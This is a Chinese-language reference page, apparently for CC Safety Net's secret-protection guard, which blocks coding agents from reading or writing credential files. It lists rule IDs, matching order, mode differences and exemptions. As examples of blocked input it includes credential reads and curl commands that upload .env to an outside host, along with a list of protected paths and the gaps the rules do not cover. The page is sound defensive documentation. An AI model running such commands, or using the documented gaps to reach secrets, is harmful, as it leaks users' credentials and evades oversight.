机密保护会阻止读写可能包含凭证的文件，例如 SSH 密钥、`.env` 文件、云凭证存储和编码智能体的身份验证令牌。它在命令分析之前运行，并适用于**所有**安全级别。它会拒绝超出结构分析限制的输入。

本页列出每个内置规则 ID、匹配内容和默认状态。你可以据此确认某个路径是否受保护，以及由哪个规则 ID 控制。`secret_protection` schema 见[策略](/zh-Hans/configuration/policy#secret-protection)，防护流程见[架构](/zh-Hans/guides/architecture#the-ordered-guard-stages)，命令示例见[被阻止的命令](/zh-Hans/reference/blocked-commands#sensitive-paths)。

共有 **138 条已注册规则**。其中大多数属于共用同一 ID 模式的生成族，因此下表按族列出其 ID 形式，而不是逐一列出每个 ID。除十三条规则的[编码 CLI 配置层](#coding-cli-config-tier-off-by-default)外，所有规则默认开启。

## 运行位置

敏感路径保护是一个防护阶段，它在命令分析**之前**运行，涵盖受支持的**命令**、**路径**、**搜索**（grep/glob）和**补丁**形式。对于 CC Safety Net 不识别的工具，它会同时检查命令候选提取和类路径值，但绝不会把该工具的任意文本当作 shell 命令。

| 形式 | 检查内容 |
| --- | --- |
| `command` | 从解析后的命令中提取的路径目标，包括命令段、管道、重定向目标、命令替换、`VAR=value` 赋值的值、赋值型扩展的备用文本（`${VAR:=path}`、`${VAR=path}`）、`curl` 上传选项指向的文件，以及解释器运行的内联代码 |
| `path` | 提取的类路径工具值（读、写、编辑工具输入） |
| `search`（`grep`、`glob`） | 文件操作数，与提供模式的标志区分开来 |
| `patch` | 提取的类路径工具值 |
| 未知工具 | 命令候选提取**和**路径值两者 |

CC Safety Net 会把类路径键下的取值当作路径读取，该键下数组里的字符串同样如此。指向下载目标的键也算类路径键，因此工具写入的文件会像它读取的文件一样接受检查。在 `command` 以外的所有路由上，如果工具输入整体是一个字符串而不是对象，就按 patch 文本读取，规则也就能看到该 patch 指向的文件。

匹配会以 `hard_stop` 意图拒绝，并携带匹配到的规则 ID，因此[阻止消息](/zh-Hans/guides/how-it-works#what-a-block-looks-like)和[审计日志](/zh-Hans/reference/audit-log)都会指明确切的规则。读取也会被阻止，而不仅仅是写入：`cat .env`、`strings id_rsa` 和 `dd if=.env` 都会被阻止。

相对路径操作数按命令已经进入的目录解析，而不是按命令起始的目录解析。机密保护会遍历整条命令，像 shell 一样跟踪工作目录。`cd` 会改变后续相对操作数的基准目录；`cd` 引用保存了目录的简单赋值变量时，也会跟进它的值。`cd ~ && cat .ssh/config`、`cd ~ && cat .ssh/config | grep Host`、`cd ~ && cat > .ssh/config` 和 `d=~; cd "$d" && cat .ssh/config` 都会在 `secret.home.ssh` 下被阻止，证据会指明操作数 `.ssh/config`。位于 `cd` 之前的读取（例如 `cat .ssh/config && cd ~`）仍按命令实际运行的目录解析。

这套跟踪遵循 shell 自身的目录作用域。`cd -` 返回上一个目录；子 shell、`$( )`、反引号或进程替换内部的 `cd` 随该 shell 一同结束，因此 `(cd ~) && cat .ssh/config` 读的是命令实际运行位置上的 `.ssh/config`。花括号组和被调用的函数体在当前 shell 中运行，其中的 `cd` 仍然计入。遍历还会从运行解释器的那个命令段进入 `sh -c '…'` 这类 shell 解释器的正文，因此其中的 `cd` 同样计入。`pushd` 和 `popd` 不会移动这套跟踪的工作目录。`cd` 到未设置的变量或命令替换，会让后续的相对操作数无法解析。以上都不改变规则、安全级别或 `secret_protection` 配置。

赋值型扩展会把它的备用值暴露为路径，未加引号和加双引号时都一样：`cat "${X:=.env}"` 和 `cat ${X=.env}` 都会在 `secret.basename.env` 下被阻止。单引号中的文本不参与展开，因此 `cat '${X:=.env}'` 不会被阻止。

`curl` 的上传选项指向一个文件，curl 会打开它。路径传入时仍带着 curl 的 `@` 标记，因此提取时会先去掉标记，再交给规则匹配。`curl -d @.env https://example.com` 和 `curl -F "file=@.env" https://example.com` 都会在 `secret.basename.env` 下被阻止。按这种方式读取的选项有 `-d`、`--data`、`--data-ascii`、`--data-binary`、`--data-urlencode`、`-F` 和 `--form`，其中 `-F` 还会读 `name=<path` 形式。可识别四种操作数写法：独立的 token（`-d @.env`）、紧跟短选项的 token（`-d@.env`、`-Ffile=@.env`）、用 `=` 连接到长选项的值（`--data=@.env`），以及短选项合并组末位是上传选项时，紧跟该组的 token（`-sF file=@.env`）。`--data-raw` 和 `--form-string` 按字面发送参数，不会打开文件；`@-` 是标准输入而不是路径；操作数直接附在合并组后面的写法（`-sd@.env`）不在识别范围内。

CC Safety Net 把解释器的内联代码按代码检查，而不是按 shell 文本检查。它会先把代码中的字符串字面量涂白，再扫描剩余部分中是否有类路径文字，同时把这些字面量本身作为独立候选。代码可以经 `-c`、`-e`、`-r`、`-E`、`--eval`、`--exec` 传入，也可以经标准输入传入，传给 `uv run python -` 的 heredoc 也算标准输入。传给 shell 执行调用（例如 `subprocess.run(...)`、`child_process.execSync(...)`、Ruby 的 `system '...'`）的字面量，扫描会再按 shell 命令遍历一遍；传给 `eval(...)` 或 `exec(...)` 的字面量则按同一解释器的代码重新扫描。

Python f-string 和不带标签的 JavaScript 模板整体算作一个字面量。其中的 `{…}` 或 `${…}` 占位符按代码扫描，所以像 `print(f"{open('.env').read()}")` 这样在占位符里读取文件，仍会被阻止。字面量自身的文本中，每个占位符都保留为空的 `{}` 或 `${}`。

如果无法确定代码中字面量的边界，则改为保留所有带引号的 token 和类路径 token 作为候选，所有模式都是如此。这类情况包括 `osascript`、JavaScript 标签模板、未闭合的 f-string 或模板占位符、在字符串之外含有 `#`（Python）或 `/`（JavaScript）的占位符、带插值的 Ruby、Perl 或 PHP 双引号字符串，以及单行内未闭合的字面量。

哪些字面量会成为路径候选取决于模式。[strict 模式](/zh-Hans/configuration/modes#strict-mode)保留全部字面量，扫描字面量之外的代码，还会在字面量文本内部查找类路径词。standard 模式对这三项都做了收窄，详见 [standard 模式下的解释器字面量](#interpreter-literals-in-standard-mode)。standard 模式的各项收窄都不适用于配置的拒绝路径。命中拒绝路径的字面量在两种模式下都会在 `secret.deny-path` 下被阻止。

内置匹配不会把远程 URL、搜索用的正则表达式，或仅以形似敏感路径的前缀开头的文字当作本地路径。`file:` URL 属于本地路径，仍然受保护。带空格的文件名只要在磁盘上确实存在，同样仍受保护。在已识别的 CC Safety Net `explain` 调用中，被解释的命令属于数据，不会被视为文件操作数。

### gh 和 git 中接收文本的选项

`gh` 和 `git` 的部分选项接收的是搜索文本、标题、消息或过滤条件，而不是文件名，这些取值不会成为路径候选。命令行上的其他操作数仍按路径检查。

`gh` 的文本选项是 `--search`、`-S`、`--title`、`-t`、`--body`、`-b`、`--jq` 和 `-q`。取值可以是独立的 token，也可以用 `=` 连接，因此 `gh issue list --search credentials` 和 `gh issue list --search=credentials` 都能运行。其余操作数仍是候选，所以 `gh gist create credentials`、`gh pr create --body-file credentials` 和 `gh api --input credentials` 依旧会被阻止。

`git` 只在 `commit`、`merge`、`notes`、`stash`、`tag` 这几个子命令下把 `-m` 和 `--message` 当作文本，因为只有它们的 `-m` 接收的是一段消息。`git commit -m credentials` 可以运行；`git checkout -m credentials` 和 `git log -m credentials` 中 `-m` 的含义不同，依旧会被阻止。`--grep` 在任何子命令下都按文本处理。以 `m` 结尾、前面各字母都不带取值的短选项合并写法会按 `-m` 读取，因此 `git commit -am credentials` 和 `git commit -nm credentials` 也能运行。`m` 之前允许出现的字母是 `a`、`e`、`i`、`n`、`o`、`p`、`q`、`s` 和 `v`。`-F` 不在其中，因为 `git commit -F` 从文件里读取提交信息，所以 `git commit -Fm credentials` 仍会被阻止。

`--` 之后的所有 token 重新按操作数处理，并作为路径检查。

<span id="what-standard-mode-does-not-count-as-a-read"></span>

### standard 模式不算作读取的情形

当输入是命令时，[standard 模式](/zh-Hans/configuration/modes)针对内置敏感路径判定的是对它们的真正读取，而不是它们的名称是否出现过。以下形式不算作读取，但都不会放宽已配置的拒绝路径。

**新建、写入或仅提及的文件。** 以下形式只放宽内置的文件名规则，不放宽[主目录规则](#home-directory-rules)和[编码 CLI 规则](#coding-cli-credential-tier-on-by-default)。

- 磁盘上实际是**目录**的机密文件名。
- 含空白字符的词，既不以类路径字符（`~`、`.`、`/` 或盘符）开头，磁盘上也不存在，例如 diff 头部，或者只是引用了文件名的普通语句。含 `$` 展开的词仍会被检查。
- 输出重定向**新建**了一个机密同名文件，前提是该文件原本不存在，例如在没有 `.env` 的目录下执行 `printf token > .env`。含 `$` 的目标仍会被检查。
- `mkdir` 或 `touch` 的操作数，含 `$` 展开的也算，因此 `mkdir -p fx/credentials && touch fx/.env` 可以运行。带 `-r` 或 `--reference` 的 `touch` 的所有操作数仍会被检查；同一命令上的重定向仍按重定向判定。
- `tailscale cert` 的 `--cert-file` 或 `--key-file` 取值，即该命令要写入的文件。写在 `sudo` 或 `env` 之后，或者写成 `timeout <n> tailscale cert` 时同样适用。
- `openssl x509 -in` 的输入文件，因为无论文件内容是什么，`x509` 都只输出证书数据。`rsa`、`pkey`、`pkcs12` 等其他 `openssl` 子命令的输入仍会被检查，`x509` 的其他文件选项（例如 `-signkey`）也一样。

`tailscale cert` 会打印它写入的文件名，`openssl x509` 读取输入失败时也会报出文件名。因此只要其中任一命令的输出可能流入管道、协进程或被捕获，对应文件就仍会被检查。例外情况是：整行命令全部是 `cd`、`grep`、`head`、`tail`、`openssl` 或 `tailscale`（前面可以带 `timeout <n>`），且不含命令替换或进程替换。所以 `timeout 60 tailscale cert --cert-file crt.pem --key-file key.pem host 2>&1 | grep -v Warning | tail -5` 可以运行，`tailscale cert --key-file key.pem host | xargs cat` 会被阻止。输出接入管道的 `mkdir` 或 `touch`，以及位于含进程替换的命令中的 `mkdir` 或 `touch`，都不会被放宽。

**循环列表中的词。** 如果 `for` 循环变量没有流入其他受检查的词，standard 模式在所有内置规则下都会跳过该循环的列表词。`for t in .env.local; do grep -c -- "$t" notes.md; done` 可以运行，因为 `$t` 只是 `grep` 的匹配模式。出现以下任一情况时，列表词仍会被检查：

- 变量本身、`${!` 间接引用，或与变量名相同的词（nameref）出现在其他受检查的词中，例如读取命令的操作数、重定向目标、赋值、解释器内联代码或嵌套循环的列表。
- 循环本身，或引用该变量的命令段，位于某个管道之前。
- 命令中含有进程替换或协进程。

因此 `for f in .env; do cat "$f"; done` 和 `for f in .env; do echo $f; done | xargs cat` 都会被阻止。循环把名称写入文件、再由后续命令读回，或用 `printf -v` 把名称复制到别的变量时，standard 模式不会追踪。不使用循环时，同样的命令也不会被追踪。

位于 `do`、`then`、`elif`、`else`、`if`、`while`、`until` 或 `!` 之后的命令，按它出现在命令开头时的方式判定，因此 `if true; then echo .env; fi` 可以运行。

**纯元数据查看。** standard 模式同样允许对受保护路径只做元数据查看，所有内置规则都适用。这项允许不限于独立命令，复合命令中的单个命令段同样适用。允许的形式如下：

- `ls` 和 `stat`
- `test -e FILE`、`test -f FILE`、`[ -e FILE ]` 和 `[ -f FILE ]`
- `git check-ignore`
- 不带 `-delete`、`-files0-from`、`-exec`、`-execdir`、`-fls`、`-fprint`、`-fprint0`、`-fprintf`、`-ok`、`-okdir` 的 `find`
- 选项只有 `-l`、`-w`、`-c`、`-m`、`--lines`、`--words`、`--bytes` 或 `--chars` 的 `wc`，例如 `wc -l .env`
- 通过 `-l`、`-c`、`-q`、`--files-with-matches`、`--files-without-match`、`--count`、`--quiet`，或仅限 `grep` 的 `-L`，把输出限定为文件名、计数或退出状态的 `grep` 或 `rg`，例如 `grep -l KEY .env`

`find -files0-from FILE` 会读取 FILE，因此 FILE 在所有模式下都是路径候选，从不算作纯元数据查看。

带有 `-f` 或 `--file` 模式文件、`rg --pre` 预处理器，或 `--json`、`--format` 选项的 `grep` 和 `rg` 不符合条件。`-l`、`-L`、`-c`、`-q` 如果被其他选项当作取值，就不计入，因此 `grep -e -l .env` 会被阻止。对 `grep` 而言，该选项必须写在第一个操作数之前才计入，因为不重排参数的 `grep` 会把后面的 `-l` 当作文件名，所以 `grep KEY -l .env` 会被阻止。`rg -L` 会跟随符号链接并输出匹配行，同样不符合条件。

即使是 `wc`、`grep` 或 `rg` 的查看，只要输出可能经由以下任一途径流向读取方，仍会被检查：

- 命令中位于其后的管道，包括外层子 shell、花括号组、条件语句、循环或被调用函数之后的管道
- 同时含有按 shell 读取的 heredoc 的命令中的任何管道
- 命令替换、进程替换或解释器的执行调用
- 协进程（`coproc` 或 `|&`）

输出只会向右流动，所以前面的管道不影响判定。`cat a | head -60; wc -l .env` 可以运行，而 `wc -l .env; cat a | head` 和 `grep -l KEY .env | xargs cat` 会被阻止。

[strict 模式](/zh-Hans/configuration/modes#strict-mode)不套用上述任何一条：以上形式仍算读取，纯元数据探查同样会被阻止。

### standard 模式下的解释器字面量

在 standard 模式下，解释器代码中的字符串字面量如何处理，首先取决于代码中是否出现可识别的文件系统、命令执行或 eval 标记，例如 `fs`、`subprocess`、对 `open` 的调用，或 `readFile` 这类标识符。

- 代码中任何位置都没有标记时，所有字面量都是数据。`python -c "x = '.env'"` 会被允许。
- Python 或 JavaScript 代码（`python` 及 `python3` 等带版本号的名称、`node`、`bun`、`deno`）中有标记时，按位置逐个判定字面量，规则见下文。
- 其他解释器的代码中有标记时，所有字面量都保留为候选。

在 Python 和 JavaScript 中，位于以下位置的字面量属于数据：

- 列表、集合或元组的元素
- 字典的键或值，或对象的属性值
- 下标中的键，例如 `d['.env']`
- `in`、`not in`、`==` 或 `!=` 的操作数，包括 JavaScript 的 `===` 和 `!==`

其他位置的字面量仍是候选，例如函数调用参数、被赋的值或返回值。`python3 -c "import json; print(json.load(open('map.json'))['.env'])"` 可以运行，因为 `'.env'` 是下标中的键。`python -c "open('.env')"` 会在 `secret.basename.env` 下被阻止，因为 `'.env'` 是调用参数。不含逗号的括号只是分组而不是元组，所以 `p = ('.env')` 中的字面量仍是候选。

如果代码中出现命令执行函数或模块的名称，方括号和圆括号内的字面量仍是候选，因为它们可能组成参数向量。这涵盖列表和元组的元素以及下标中的键；集合成员、字典条目和比较操作数仍是数据。判断依据是：某个标识符，或它按 camelCase、snake_case 拆分出的某一部分，以 `exec` 或 `spawn` 开头，或者就是 `popen`、`system`、`subprocess`，例如 `execFileSync` 或 `posix_spawnp`。

代码中出现以下任一情况时，不再判定位置，所有字面量都保留为候选：

- `/*` 注释，或含有括号的行注释（Python 为 `#`，JavaScript 为 `//`）
- 左括号前的 `*` 或 `...`，例如解包或展开（`*(`、`*[`、`...[`）
- 与关键字同名的方法调用，例如 `.of(` 或 `.if(`

只用来指明写入操作所新建文件的字面量，按输出重定向的方式处理，即仅在该文件尚不存在时放宽。可识别的写入如下：

- `Path(...)` 或 `pathlib.Path(...)` 的参数，调用中在它之前没有字符串字面量，且调用之后紧跟 `.write_text(` 或 `.write_bytes(`
- 不带对象前缀的 `open(` 的第一个参数，且其模式是包含 `w`、`x` 或 `a`、不含 `r` 和 `+` 的字面量
- `writeFile`、`writeFileSync`、`appendFile`、`appendFileSync` 或 `Bun.write` 的第一个参数

在 `.env.local` 不存在的位置，`python3 -c "open('.env.local', 'w').write('A=1')"` 可以运行。以默认读取模式、`r+` 或 `a+` 打开，或模式由变量名给出的 `open` 仍会被阻止；像 `Path('fixtures', '.env.test')` 这样拼接在字面量目录下的路径也一样。同一名称如果在代码其他地方出现在数据位置以外，就仍是候选，所以先写入再读回的文件依旧会被阻止。

数据位置和写入位置只放宽内置的文件名规则，例如 `.env`、`*.pem` 或 `credentials`。[主目录](#home-directory-rules)或[编码 CLI](#coding-cli-credential-tier-on-by-default) 路径无论在什么位置都保留为候选，执行调用接收的字面量也一样。standard 模式不会把数据字面量追踪到后续的读取，所以 `python3 -c "for f in {'.env'}: print(open(f).read())"` 会被允许，因为 `'.env'` 是集合成员。

在 Python 和 JavaScript 代码中，standard 模式也不扫描字符串字面量之外的词，因此 JavaScript 的属性访问 `x.key`，或提到 `.env` 的 Python 注释，都不会被当作路径。其他解释器的代码仍会扫描字面量之外的部分。

standard 模式只在执行调用能接收到某个字面量时，才把它按 shell 文本遍历：字面量必须位于该调用的括号内，或紧跟在不带括号的 `system`、`exec`、`spawn`、`popen` 之后。如果调用的第一个参数是名称或含有名称，代码就可以把任何东西传进去，因此该段代码中的所有字面量都会被遍历。点号前后和左括号之前的空格不会让调用逃过识别，`child_process . execSync ('cat .env')` 同样会被认出。

不过，第一个参数是列表或元组时属于例外。只要满足以下全部条件，就只遍历调用内的字面量：只由普通字面量和名称组成，单独构成该参数，第一个元素是表示程序名的字面量，且没有任何元素是 shell 或解释器名称（包括 `cmd`、`powershell`、`pwsh`），或 `-c`、`-e`、`-r`、`-E`、`--eval`、`--exec` 选项。`subprocess.run(['ffprobe', '-v', 'error', f])` 只遍历调用内的字面量，而 `subprocess.run(['sh', '-c', cmd])` 和 `subprocess.run(['nice', cmd] + extra)` 会遍历代码中的所有字面量。对于 `['watch', cmd]` 或 `['ssh', host, cmd]` 这类把另一个参数当作命令行执行的程序，不会继续追踪到 `cmd`，这与 shell 命令中的 `watch` 和 `ssh` 一致。

[strict 模式](/zh-Hans/configuration/modes#strict-mode)不套用上述任何一条：无论字面量处于什么位置都保留为候选，在所有解释器中都扫描字面量之外的代码，只要代码中有执行调用就按 shell 文本遍历全部字面量，并在字面量文本内部查找类路径词。

## 匹配顺序

每个候选路径都会依次经过以下检查。第一个决定性的结果即为最终结果；豁免只对排在其后的规则生效。

1. **配置的[拒绝路径](/zh-Hans/configuration/policy#deny-paths)。** 在所有内置规则和所有豁免之前检查。命中归因于 `secret.deny-path`。
2. **[主目录规则](#home-directory-rules)。** 检查整个受保护目录，例如 `~/.ssh`。这些规则优先于 env 模板豁免和公钥豁免，因此除非有机密允许路径覆盖，`~/.ssh/.env.example` 和 `~/.ssh/id_rsa.pub` 仍然会被阻止。
3. **Env 模板豁免。** 模板基本名称保持可读；请参阅[豁免](#exemptions)。
4. **[编码 CLI 规则](#coding-cli-credential-tier-on-by-default)。** 检查各智能体的凭证和配置路径。
5. **公钥豁免。** `id_rsa.pub`、`id_ed25519.pub` 和 `id_ecdsa.pub` 在受保护目录之外不属于机密。
6. **[基本名称规则](#basename-rules)**，然后是 **`.env.*` 模式**，然后是**[密钥变体规则](#key-variant-rules)**。
7. **vendored 目录豁免。** 仅抑制剩下的两个族；请参阅[豁免](#exemptions)。
8. **宽泛的 SSH 基本名称模式**，然后跳过 **[URL 查询文本](#url-query-text)**，最后是**[扩展规则](#extension-rules)**。

内置规则匹配后，配置的[机密允许路径](/zh-Hans/configuration/policy#secret-allow-paths)会抑制该匹配，除非规则 ID 以 `secret.cli.` 开头。拒绝路径已在第 1 步胜出，而编码 CLI 规则永远不会被放宽。

<span id="basename-rules"></span>

## 基本名称规则

九条规则会阻止任意目录下的精确基本名称。

| 规则 ID | 基本名称 |
| --- | --- |
| `secret.basename.env` | `.env` |
| `secret.basename.npmrc` | `.npmrc` |
| `secret.basename.pypirc` | `.pypirc` |
| `secret.basename.netrc` | `.netrc` |
| `secret.basename.git-credentials` | `.git-credentials` |
| `secret.basename.id-rsa` | `id_rsa` |
| `secret.basename.id-ed25519` | `id_ed25519` |
| `secret.basename.id-ecdsa` | `id_ecdsa` |
| `secret.basename.credentials` | `credentials` |

精确名称匹配有两个边界：

- `secret.basename.credentials` 只匹配 `credentials` 这个精确名称。`credentials.json` 既不匹配它，也不匹配任何其他内置规则。
- 没有针对 `id_dsa` 的基本名称规则。完全同名的 `id_dsa` 仍会被下面的宽泛模式 `secret.pattern.ssh-key-basename` 阻止。

一条模式规则扩展了 `.env` 族。`secret.pattern.env-variant` 会阻止所有以 `.env.` 开头的基本名称，例如 `.env.local`、`.env.production` 和 `.env.template.local`。[豁免的模板](#exemptions)除外。

<span id="home-directory-rules"></span>

## 主目录规则

这些规则保护主目录下的位置：目录本身及其内部的所有内容。

它们会同时比较字面的主目录相对路径和经过文件系统解析的路径。`~/.ssh`、`~/.aws` 等凭证目录即使是符号链接也仍然受保护；字面比较前会先折叠 `..` 段。

| 规则 ID | 保护内容 |
| --- | --- |
| `secret.home.ssh` | `~/.ssh` |
| `secret.home.aws` | `~/.aws` |
| `secret.home.gcp` | `~/.gcp` |
| `secret.home.gcloud-config` | `~/.config/gcloud` |
| `secret.home.kube-config` | `~/.kube/config` |
| `secret.home.docker-config` | `~/.docker/config.json` |
| `secret.home.gh-hosts` | `~/.config/gh/hosts.yml` |

这两条单文件规则（`kube-config`、`docker-config`）各有八条配套规则，用于覆盖重命名后的备份，ID 形式为 `secret.home.<slug>.<suffix>`：后缀为 `bak`、`backup`、`copy`、`disabled`、`old`、`orig`、`save` 和 `tmp`。因此 `~/.kube/config.bak` 会在 `secret.home.kube-config.bak` 下被阻止，`~/.docker/config.json.old` 会在 `secret.home.docker-config.old` 下被阻止。这样共有 16 条生成规则，整个族共 23 条。

<span id="key-variant-rules"></span>

## 密钥变体规则

为规避保护而重命名的密钥和凭证文件副本自成一族，由五个受保护前缀构成：`id_rsa`、`id_dsa`、`id_ed25519`、`id_ecdsa` 和 `credentials`。各 ID 中的 slug 就是改用短横线书写的前缀（`id-rsa`、`credentials` 等）。

- **分隔符变体。** `secret.variant.<slug>.separator`（5 条规则）阻止前缀后跟 `-` 或 `_` 以及其后任何内容的名称，例如 `id_rsa-old`、`id_rsa_backup` 和 `credentials_prod`。
- **点后缀变体。** `secret.variant.<slug>.<suffix>`（50 条规则）阻止前缀后正好跟上十个后缀之一的名称：`.bak`、`.backup`、`.copy`、`.disabled`、`.key`、`.old`、`.orig`、`.pem`、`.save`、`.tmp`。因此 `id_rsa.bak` 会在 `secret.variant.id-rsa.bak` 下被阻止，`credentials.pem` 会在 `secret.variant.credentials.pem` 下被阻止。

该族只做精确匹配，因此相似名称不会被阻止：`id_rsafoo` 没有匹配的分隔符，`credentials.json` 的后缀也不在列表中。

最后还有一条宽泛模式。`secret.pattern.ssh-key-basename` 会阻止任何以 `_rsa`、`_dsa`、`_ed25519` 或 `_ecdsa` 结尾的**无扩展名**基本名称，例如 `deploy_key_rsa` 和 `github_ed25519`。含有点号的名称永远不会匹配它。

<span id="extension-rules"></span>

## 扩展规则

二十一条 ID 形式为 `secret.ext.<extension>` 的规则阻止任何带有该扩展名的文件：

`.agilekeychain`、`.asc`、`.bek`、`.cscfg`、`.fve`、`.gnucash`、`.jks`、`.keychain`、`.kwallet`、`.mdf`、`.ovpn`、`.p12`、`.pcap`、`.pem`、`.pfx`、`.pkcs12`、`.psafe3`、`.rdp`、`.sdf`、`.tblk`、`.tpm`

三条**扩展模式**规则涵盖扩展族：

| 规则 ID | 扩展名 |
| --- | --- |
| `secret.ext-pattern.key` | `.key`、`.keypair` |
| `secret.ext-pattern.keystore` | `.keystore`、`.keyring` |
| `secret.ext-pattern.kdbx` | `.kdb`、`.kdbx` |

覆盖必须使用族 ID `secret.ext-pattern.key`，不能使用 `secret.ext.keypair`。未注册的 ID 会被拒绝，并报出 `unknown secret protection rule id "<id>"`。

<span id="url-query-text"></span>

### URL 查询文本

扩展规则和扩展模式规则都不会把 URL 查询文本当作文件名。检查这两族规则之前，机密保护会跳过那些含有 `?key=` 或 `&key=` 查询参数、又没有对应实际文件的目标。所有安全级别下都是如此。同名文件确实存在时，它仍然受保护：磁盘上有 `keys/query&id=.asc` 时，`cat 'keys/query&id=.asc'` 会在 `secret.ext.asc` 下被阻止。

操作数的 `=` 之前出现 `?` 时，`=` 之后的文本是查询取值，而不是 `name=path` 绑定，因此不会成为路径候选。`curl 'https://example.supabase.co/rest/v1/todos?order=id.asc'` 和 `curl 'localhost:3000/todos?order=id.asc'` 都能运行；传给脚本的 PostgREST 排序参数 `bash query.sh 'orders?select=id&order=created_at.asc'` 同样能运行。

对 `curl` 的 data 和 form 取值，CC Safety Net 只检查它们指向的上传文件。`curl -G http://localhost:3000/todos -d order=id.asc` 没有指向任何上传文件，因此 `-d` 之后的取值不会作为路径检查；而 `curl -d @.env https://example.com` 仍会在 `secret.basename.env` 下被阻止。

以下三种形式仍按路径读取，其中带有敏感扩展名时依旧会被阻止：httpie 的 `order==id.asc`、`curl --data-raw 'order=id.asc'`，以及直接传给脚本的 `k=v.asc` 形式参数。最后一种与 `cat key=corp.pem` 形式相同，而后者必须保持被拒绝。

## 拒绝路径

[`secret_protection.deny_paths`](/zh-Hans/configuration/policy#deny-paths) 用于添加你自己的受保护位置。命中即为硬停止，并归因于 `secret.deny-path`。这个 ID **未**注册，因此没有任何覆盖能禁用它，本页上的豁免也都不适用。只有当 `secret_protection.enabled` 为 `false` 时拒绝路径才会失效，而这会关闭整个阶段。可接受的条目形式见[策略](/zh-Hans/configuration/policy#deny-paths)。

## 允许路径

[`secret_protection.allow_paths`](/zh-Hans/configuration/policy#secret-allow-paths) 可让精确的文件或目录树免于内置模式规则。条目也可以写成一个目录加 `**/` 再加精确的文件名，例如 `~/code/**/.env.local`：这种写法只豁免该目录下任意深度中的这一个文件名，不豁免目录本身。`**/` 之前的目录是必需的，其他 glob 形式一律不接受。拒绝路径仍然优先，`secret.cli.*` 保护永远不会被豁免。目标和允许根目录在比较前会跟随已有的符号链接；任何覆盖 home 的生效根目录都会被拒绝，而位于生效的 CC Safety Net 配置根目录下的目标仍然受保护。完整验证表见[策略](/zh-Hans/configuration/policy#secret-allow-paths)。

<span id="exemptions"></span>

## 豁免

三项豁免为上述规则划定了边界。它们都不会放宽已配置的拒绝路径。

- **Env 模板。** `.env.example`、`.env.sample`、`.env.template`、`.env.tpl` 和 `.env.defaults` 这些精确基本名称，以及任何以 `.env.example.` 或 `.env.sample.` 开头的名称，可豁免除主目录规则以外的所有内置规则，因为主目录规则先于豁免检查。`cat .env.tpl` 会被允许，`cat ~/.ssh/.env.tpl` 则在 `secret.home.ssh` 下被阻止。这种前缀形式不会继续扩展。`.env.template.local` 会和其他 `.env.*` 名称一样在 `secret.pattern.env-variant` 下被阻止。
- **公钥。** `id_rsa.pub`、`id_ed25519.pub` 和 `id_ecdsa.pub` 不属于机密，因此可获得豁免，但仅限受保护的主目录之外，因为那些目录会先被检查。`./id_rsa.pub` 会被允许；`~/.ssh/id_rsa.pub` 会在 `secret.home.ssh` 下被阻止。
- **vendored 目录。** 当任一路径段为 `node_modules` 或 `__pycache__`，或者出现相邻的 `vendor/bundle` 或 `vendor/cache` 组合时，恰好有两个族会被抑制：扩展规则（普通规则和模式规则）以及宽泛的 `secret.pattern.ssh-key-basename` 规则。其余规则在这些目录中依然适用。`node_modules/x/.env` 和 `node_modules/x/id_rsa` 照常被阻止。`.git` 不在该跳过集合中。

## 配置

所有配置都位于 [`policy.json`](/zh-Hans/configuration/policy#secret-protection) 中：

- `secret_protection.enabled: false` 会关闭整个阶段，包括内置规则和拒绝路径。
- `secret_protection.overrides` 按已注册的 ID 设置单条规则的状态：`"off"` 禁用默认开启的规则；`"on"` 启用配置层规则。
- `secret_protection.deny_paths` 添加你自己的受保护位置。
- `secret_protection.allow_paths` 在检查过拒绝路径之后，让精确的文件、目录树，或某个目录下的一个文件名免于非 CLI 的内置规则。

破坏性命令的[允许路径](/zh-Hans/guides/analysis-engine#recursive-delete-target-classification)不会放宽机密保护；standard 模式下的任何放宽也都不会触及已配置的拒绝路径。只有 `secret_protection.allow_paths` 具有上述受限效果。standard 模式不算作读取的形式见[上文](#what-standard-mode-does-not-count-as-a-read)。在 [strict 模式](/zh-Hans/configuration/modes#strict-mode)下，对受保护路径的纯元数据探查（`test -f ~/.ssh/id_rsa`、`find ~/.ssh -type f`、`ls -la ~/.ssh`、`stat .env`）同样会被阻止。[仪表板](/zh-Hans/guides/dashboard#secret-protection)通过 UI 编辑同一批设置。

<Note>
  机密保护是一个有界的模式集合，而不是通用的读取边界。凭证若位于任何规则都不识别的文件中，就得不到保护。有关这条边界，请参阅[CC Safety Net 无法提供帮助的范围](/zh-Hans/guides/vs-sandboxing#where-cc-safety-net-cannot-help)。有关分层的注意事项，请参阅[已知限制](/zh-Hans/guides/known-limitations)。机密**脱敏**是从日志和阻止消息中清除凭证值的独立机制，详情见[审计日志参考](/zh-Hans/reference/audit-log#secret-redaction)和[安全模型](/zh-Hans/guides/security-model#secret-redaction)。
</Note>
